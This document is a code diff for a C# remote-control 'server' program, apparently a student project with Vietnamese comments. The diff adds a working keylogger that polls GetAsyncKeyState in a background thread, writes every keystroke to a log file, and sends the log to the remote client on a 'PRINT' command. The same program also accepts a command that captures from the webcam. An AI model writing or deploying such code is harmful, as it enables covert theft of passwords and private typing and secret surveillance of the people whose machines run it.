@@ -18,6 +18,9 @@ using System.Threading;
 using System.Timers;
 using AForge.Video;
 using AForge.Video.DirectShow;
+using System.Runtime.InteropServices;
+
+
 
 namespace server
 {
@@ -286,25 +289,7 @@ namespace server
             Program.nw.Write(s); Program.nw.Flush();
         }
        
-        public void keylog()
-        {
-            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
-            String s = "";
-            tklog.Start();
-            tklog.Suspend();
-            while (true)
-            {
-                receiveSignal(ref s);
-                switch (s)
-                {
-                    case "PRINT": printkeys(); break;
-                    case "HOOK": hookKey(ref tklog); break;
-                    case "UNHOOK": unhook(ref tklog); break;
-                    case "QUIT": return;
-                }
-            }
-
-        }
+        
         public void application()
         {
             String ss = "";
@@ -648,6 +633,12 @@ namespace server
             }
 
         }
+
+        bool keylogMode = false;
+        bool hookEnabled = false;
+        Thread keyThread;
+        string logPath = @"D:\keylog.txt";
+
         public void StartServer()
         {
             // Tạo vòng lặp để tujw kết nối lại trong trường hợp bị rớt mạng 
@@ -687,34 +678,55 @@ namespace server
                         receiveSignal(ref s);
 
                         // Mất kết nối thật rồi...
-                        if (s == null) break; 
-
+                        if (s == null) break;
                         switch (s)
                         {
-                            //case "KEYLOG": keylog(); break;
-                            //case "SHUTDOWN": shutdown(); break;
-                            //case "REGISTRY": registry(); break;
-                            //case "TAKEPIC": takepic(); break;
-                            //case "PROCESS": process(); break;
-                            //case "APPLICATION": application(); break;
-                            case "WEBCAM": webcam(); break;
+                            case "KEYLOG":
+                                keylogMode = true;
+                                Program.client.Send(Encoding.UTF8.GetBytes("OK KEYLOG\n"));
+                                break;
 
-                                //################
-                                // Thêm try-catch ở đây để nếu webcam lỗi thì biết ngay
-                                try
+                            case "HOOK":
+                                if (!keylogMode)
                                 {
-                                    webcam();
+                                    Program.client.Send(Encoding.UTF8.GetBytes("ERR NOT_IN_KEYLOG_MODE\n"));
+                                    break;
                                 }
-                                catch (Exception ex)
+
+                                if (!hookEnabled)
                                 {
-                                    MessageBox.Show("Lỗi bật Webcam: " + ex.Message);
+                                    hookEnabled = true;
+                                    keyThread = new Thread(() => runKeylogger());
+                                    keyThread.IsBackground = true;
+                                    keyThread.Start();
+                                }
+
+                                Program.client.Send(Encoding.UTF8.GetBytes("OK HOOK\n"));
+                                break;
+
+                            case "UNHOOK":
+                                hookEnabled = false;
+                                Program.client.Send(Encoding.UTF8.GetBytes("OK UNHOOK\n"));
+                                break;
+
+                            case "PRINT":
+                                if (File.Exists(logPath))
+                                {
+                                    string log = File.ReadAllText(logPath);
+                                    Program.client.Send(Encoding.UTF8.GetBytes(log + "\n"));   // gửi đúng 1 dòng
+                                }
+                                else
+                                {
+                                    Program.client.Send(Encoding.UTF8.GetBytes("NO_LOG\n"));
                                 }
                                 break;
 
-                            case "QUIT": StopWebcam(); break; 
-                            // bé nào làm cuối nhớ thêm trường hợp quit có nút quit để thoát trang nha 
-
+                            // giữ nguyên webcam case
+                            case "WEBCAM":
+                                webcam();
+                                break;
                         }
+
                     }
                 }
                 catch (Exception ex)
@@ -738,6 +750,30 @@ namespace server
             // Khóa nút lại để không bấm nhiều lần
             ((Button)sender).Enabled = false;
             MessageBox.Show("Server đã chạy ngầm!");
+        }
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(Keys vKey);
+
+        private void runKeylogger()
+        {
+            try
+            {
+                if (!File.Exists(logPath))
+                    File.WriteAllText(logPath, "");
+
+                while (hookEnabled)
+                {
+                    foreach (Keys key in Enum.GetValues(typeof(Keys)))
+                    {
+                        if (GetAsyncKeyState(key) == -32767)
+                        {
+                            File.AppendAllText(logPath, key.ToString() + " ");
+                        }
+                    }
+                    Thread.Sleep(10);
+                }
+            }
+            catch { }
         }
 
 
